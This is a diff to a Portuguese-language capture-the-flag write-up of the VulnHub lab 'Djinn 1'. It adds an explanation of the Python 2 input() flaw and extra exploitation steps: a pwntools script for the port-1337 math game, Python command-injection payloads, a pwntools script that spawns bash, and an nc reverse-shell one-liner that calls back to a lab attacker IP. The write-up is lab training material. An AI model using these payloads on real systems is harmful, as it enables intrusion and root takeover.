@@ -1,6 +1,6 @@
 ---
-title: "VulnHub - Djin 1"
-tags: [Linux, Easy]
+title: "VulnHub - Djinn 1"
+tags: [Linux, Easy, Port Knocking, Gobuster, BurpSuite, Repeater, Wfuzz, Sudo -l, Pyc, Uncompyle6, Python Input, RawInput, Pwntools, Pwn, Python Command Injection]
 categories: VulnHub
 ---
 
@@ -272,7 +272,7 @@ Baixamos ele pra nossa Kali e verificamos do que se trata esse formato pyc
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/pyc.png)
 
-É o "resto" de um binário em pytho compilado, no caso podemos perceber que é o mesmo que o nosso usuário tem permissões de root
+É o "resto" de um binário em python compilado, no caso podemos perceber que é o mesmo que o nosso usuário tem permissões de root
 
 Então vamos decompilar ele pra ter o código fonte
 
@@ -310,6 +310,12 @@ Agora então, pego um shell de root
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/unc4.png)
 
+Explicação da Vulnerabilidade
+
+[Python String](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/)
+
+A ideia aqui e explorar a função input, se eu passar uma string pra ela, ela vai interpretar como string, no caso se eu colocar s == num (querendo que o num seja número), contudo, a função input vai transformar isso em string também, qnd compara, da certo e me da o shell de root!
+
 # Flags
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/user.png)
@@ -319,3 +325,109 @@ Agora então, pego um shell de root
 # Algo a Mais
 
 Vamos verificar o que mais podemos fazer nessa máquina...
+
+Vamos verificar aquele waste na porta 1337, será que tem algo?
+
+Sim, ele tem, mas é o Port Knocking que conhecemos...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais.png)
+
+Temos como automatizar isso? Pra não precisar fazer 1000 contas de matemática
+
+## Pwntools
+
+Pra isso usei o **pwntools**
+
+O script math.py ficou assim
+
+```python
+#!/usr/bin/env python3
+# Importamos a biblioteca pwn para podermos interagir com o host
+from pwn import *
+
+# Setamos o remote host e a remote port para realizar a conexão
+c = remote('192.168.56.113',1337)
+
+# Colocamos até onde vamos receber do servidor, se eu setar uma variável vai ser tudo que eu não vou querer, que não vai continuar na execução do script
+
+# Coloquei \n\n pq é onde eu percebi que ele da dois 'enter', pra iniciar a parte escrita, é essa parte escrita de baixo que eu quero trabalhar
+c.recvuntil("\n\n", drop=True)
+# Dessa parte de baixo, parte escrita, eu quero trabalhar com tudo que vem depois do ( que é a equação matemática em si
+
+# Aqui vamos fazer o loop de 1000 vezes
+for i in range(1001):
+
+        # Aqui vou delimitar a primeira parte da equação, vou atribuir variável pq vai ser o que vai ser "dropado", não oq vai ficar na execução do script
+        # "Lendo" em pwn seria: me dê de ( até ,
+        c.recvuntil("(", drop=True)
+        a = c.recvuntil(", ", drop=True)
+
+        # Agora vamos pegar a equação matemática que está sendo pedida
+        # "Lendo" em pwn seria: me dê de ' até '
+        c.recvuntil("'", drop=True)
+        eq = c.recvuntil("'", drop=True)
+
+        # Aqui vou delimitar o segundo numero da equação, novamente vou atribuir variável pq vai ser a parte que será dropado
+        # "Lendo" em pwn seria: me dê , até )
+        c.recvuntil(", ", drop=True)
+        b = c.recvuntil(")",drop=True)
+
+        # Vamos fazer a conta
+        conta = a+eq+b
+        print("Tentativa Numero="+str(i)+" "+str(conta.decode("utf-8")))
+
+        # Agora mandamos a resposta para o servidor
+        c.sendlineafter(">",conta)
+
+# Aqui é pra quando acabar me dar um prompt da seção, pq senão eu perco o "presente"
+c.interactive()
+```
+
+E aqui está a resposta
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais1.png)
+
+## Python Command Injection
+
+Sabendo (ou não) que é uma aplicaçã python que está sendo executada, podemos tentar injetar comandos nele, importando modulos direto na linha de comando, no input dele
+
+```python
+__import__('os').system('id')
+```
+
+Vemos que é possível! Vamos pegar um shell de root então
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais2.png)
+
+```python
+__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 443 >/tmp/f')
+```
+
+Pronto, somos root!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais3.png)
+
+## Command Injection + Pwn
+
+command.py
+```python
+#!/usr/bin/env python3
+# Importamos a biblioteca pwn para podermos interagir com o host
+from pwn import *
+
+# Setamos o remote host e a remote port para realizar a conexao
+c = remote('192.168.56.113',1337)
+shell = "__import__('os').system('bash')"
+c.sendlineafter(">",shell)
+c.interactive()
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais5.png)
+
+## Bash direto
+
+Podemos fazer direto também
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais4.png)
+
+Bom, as possibilidades são muitas, bons estudos!
